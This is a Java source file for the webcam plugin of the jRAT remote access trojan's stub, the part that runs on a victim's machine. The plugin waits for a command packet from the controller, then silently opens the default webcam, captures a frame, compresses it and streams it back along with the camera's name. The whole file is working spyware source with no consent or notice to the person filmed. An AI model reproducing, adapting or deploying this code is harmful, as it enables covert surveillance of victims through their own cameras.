package pro.jrat.stub.webcam;

import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import java.io.DataOutputStream;

import pro.jrat.api.stub.StubPlugin;

import com.github.sarxos.webcam.Webcam;

public class Plugin extends StubPlugin {

	public static final byte HEADER = 120;

	public static DataInputStream dis;
	public static DataOutputStream dos;
	public static boolean enabled;
	public static Webcam cam = com.github.sarxos.webcam.Webcam.getDefault();

	public void onEnable() throws Exception {
		
	}

	public void onDisconnect(Exception ex) {
		if (cam != null && cam.isOpen()) {
			cam.close();
		}
	}

	public void onConnect(DataInputStream in, DataOutputStream out) {
		Plugin.dis = in;
		Plugin.dos = out;
	}

	public void onPacket(byte header) throws Exception {
		if (header == HEADER) {
			enabled = dis.readBoolean();
			
			if (enabled) {
				dos.writeByte(header);

				try {											
					if (!cam.isOpen()) {
						cam.open();
					}
					
					String line = cam.getName();
					dos.writeShort(line.length());
					dos.writeChars(line);
					
					BufferedImage image = cam.getImage();

					byte[] buffer = Utils.compress(Utils.encodeImage(image, 1F));

					dos.writeInt(buffer.length);
					dos.write(buffer);
				} catch (Exception ex) {
					ex.printStackTrace();
					String line = "DISABLED";
					dos.writeShort(line.length());
					dos.writeChars(line);			
				}
			} else {
				if (cam != null) {
					cam.close();
				}
			}

		}
	}

	public static synchronized String readString() throws Exception {
		short len = dis.readShort();

		StringBuffer buffer = new StringBuffer();

		for (short s = 0; s < len; s++) {
			buffer.append(dis.readChar());
		}

		String str = buffer.toString();

		if (str.startsWith("-c ")) {
			str = str.substring(3, str.length());
		}

		return str;
	}

	@Override
	public String getName() {
		try {
			return "Webcam";
		} catch (Exception ex) {
			ex.printStackTrace();
			return "Unknown";
		}
	}
}
